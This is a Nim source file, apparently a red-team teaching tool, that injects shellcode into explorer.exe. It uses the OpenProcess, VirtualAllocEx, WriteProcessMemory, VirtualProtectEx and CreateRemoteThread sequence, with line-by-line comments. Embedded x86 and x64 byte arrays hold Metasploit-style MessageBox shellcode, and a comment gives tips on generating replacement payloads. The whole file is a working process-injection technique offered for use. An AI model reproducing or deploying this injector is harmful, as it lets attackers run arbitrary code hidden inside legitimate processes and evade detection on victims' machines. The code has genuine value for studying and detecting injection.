#[
    Author: Alh4zr3d, Twitter: @alh4zr3d
    License: BSD 3-Clause
]#

import winim

proc toStringPPID(chars: openArray[WCHAR]): string =                    # This custom function converts an array of WCHARs to a Nim string
    result = ""                                                         # In this case, it's being used to convert a Win32 process name into a Nim string
    for c in chars:                                                     # so that we can then discern if it is the process we are looking for.
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetProcessByName(process_name: string): DWORD =                    # This custom function iterates through the current running processes
    var                                                                 # searching for one that matches the name passed into it and returning
        pid: DWORD = 0                                                  # the process ID once it is found.
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toStringPPID == process_name:
                pid = entry.th32ProcessID
                break

    return pid

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =     # This is the primary function that performs the injection
    
    let targetpid: DWORD = GetProcessByName("explorer.exe")             # Identify the PID for the process into which we want to inject (explorer.exe)

    let procH = OpenProcess(                                            # This call gets a handle with all access to the target process
        PROCESS_ALL_ACCESS,                                             # dwDesiredAccess - Desired access to the process
        false,                                                          # True/False - Determines whether or not subprocesses will inherit the handle.
        targetpid                                                       # dwProcessId - Identifier of the process into which we want to inject
    )

    let baseAddr = VirtualAllocEx(                                      # This call allocates virtual memory for our shellcode in the memory space of the target process (the "Ex" suffix indicates it is used for processes other than this one)
        procH,                                                          # hProcess - A handle to the target process in which we want to inject
        NULL,                                                           # lpAddress - Starting address for the region we'd like to allocate; NULL allows the function to choose for us
        cast[SIZE_T](shellcode.len),                                    # dwSize - Size of the region to allocate, in bytes (double-words)
        MEM_COMMIT,                                                     # flAllocationType - The type of memory allocation. MEM_COMMIT allocates and zeroes out the memory.
        PAGE_READWRITE                                                  # flProtect - The memory protection for the allocated region - we choose PAGE_READWRITE to allow writing to the region
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(                                  # This call copies our shellcode into the allocated memory space
        procH,                                                          # hProcess - Target process handle
        baseAddr,                                                       # lpBaseAddress - Address at which to begin writing (where our space begins)
        unsafeAddr shellcode,                                           # lpBuffer - The binary data to copy into the space (our shellcode)
        cast[SIZE_T](shellcode.len),                                    # nSize - The number of bytes to copy according to architecture
        addr bytesWritten                                               # lpNumberOfBytesWritten - Pointer to the bytesWritten variable to store the number of bytes written after success
    )

                                                                        # We now need to call VirtualProtectEx to make the memory we just wrote to executable
                                                                        # This is to avoid ever having memory with PAGE_EXECUTE_READ_WRITE permissions

    var prevPro: DWORD = 0

    var virPro = VirtualProtectEx(                                      # This call changes the memory protections of our allocated memory to make it executable
        procH,                                                          # hProcess - Handle of process in which the memory exists
        baseAddr,                                                       # lpAddress - Address at which to change memory permissions (where our allocated memory begins)
        cast[SIZE_T](shellcode.len),                                    # dwSize - Amount of memory (in bytes, or "double-words") of which to alter permissions (all of our written shellcode)
        PAGE_EXECUTE_READ,                                              # flNewProtect - New permissions
        addr prevPro                                                    # lpflOldProtect - Pointer to variable of where to store the previous permissions
    )

    var threadID: DWORD

    let threadH = CreateRemoteThread(                                   # This call executes our shellcode as a new thread in the context of the other process.
        procH,                                                          # hProcess - Handle to the target process
        NULL,                                                           # lpThreadAttributes - Attributes of new thread; if NULL, the baseline for the process is inherited
        0,                                                              # dwStackSize - Initial size of the stack of the new thread; if 0, default for executable is set
        cast[LPTHREAD_START_ROUTINE](baseAddr),                         # lpStartAddress - Address at which to begin execution, cast to the proper type
        NULL,                                                           # lpParameter - Optional pointer to a variable to be passed to the executed function
        0,                                                              # dwCreationFlags - Thread creation flags; "0" denotes immediate execution of the thread
        addr threadID                                                   # lpThreadId - Optional pointer to variable in which to store ID of new thread
    )

    defer: CloseHandle(procH)                                           # These calls close the handles we created to prevent handle leaks
    defer: CloseHandle(threadH)

                                                                        # No need for a WaitForSingleObject call here; the thread is executing in another process
                                                                        # Therefore, it doesn't matter if this process terminates.

when defined(windows):

    when defined(i386):
        var shellcode: array[272, byte] = [
        byte 0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
        0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
        0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,0x8b,0x6c,0x24,
        0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,0x4a,0x18,0x8b,0x5a,
        0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,
        0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
        0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,
        0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,
        0x08,0x29,0xd4,0x89,0xe5,0x89,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,
        0xff,0xff,0xff,0x89,0x45,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,
        0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,
        0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,
        0xe6,0x56,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,
        0x24,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x6f,0x78,0x58,0x20,0x68,0x61,0x67,
        0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x31,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe3,
        0x68,0x58,0x20,0x20,0x20,0x68,0x4d,0x53,0x46,0x21,0x68,0x72,0x6f,0x6d,0x20,
        0x68,0x6f,0x2c,0x20,0x66,0x68,0x48,0x65,0x6c,0x6c,0x31,0xc9,0x88,0x4c,0x24,
        0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
        0x55,0x08]

    elif defined(amd64):
        #[
        var shellcode: array[295, byte] = [
        byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
        0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
        0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
        0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
        0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
        0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
        0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
        0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
        0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
        0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
        0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
        0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x65,0x6c,
        0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
        0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]
        ]#

                #[
            I recommend generating the shellcode with EXITFUNC=thread to avoid terminating the
            injected process upon shellcode completion.
            eg. 
        ]# 
        var shellcode: array[323, byte] = [
        byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
        0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
        0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
        0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
        0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
        0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
        0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
        0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
        0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
        0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
        0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
        0x85,0x2b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
        0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
        0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
        0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,0x65,0x73,
        0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]

    when isMainModule:
        injectCreateRemoteThread(shellcode)